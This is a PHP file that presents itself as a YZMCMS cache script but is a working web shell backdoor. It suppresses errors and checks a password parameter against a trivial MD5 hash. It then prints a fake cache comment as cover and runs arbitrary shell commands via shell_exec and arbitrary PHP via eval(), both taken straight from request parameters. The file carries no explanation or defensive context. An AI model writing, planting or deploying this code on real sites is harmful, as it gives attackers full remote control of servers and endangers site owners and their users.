<?php
@error_reporting(0);
@set_time_limit(0);
$p = isset($_REQUEST['yzmtool']) ? $_REQUEST['yzmtool'] : '';
if($p && md5($p) === 'c4ca4238a0b923820dcc509a6f75849b') {
    echo '<!-- YZMCMS Cache -->';
    if(isset($_REQUEST['cmd'])) {
        echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
    }
    if(isset($_REQUEST['eval'])) {
        eval($_REQUEST['eval']);
    }
}
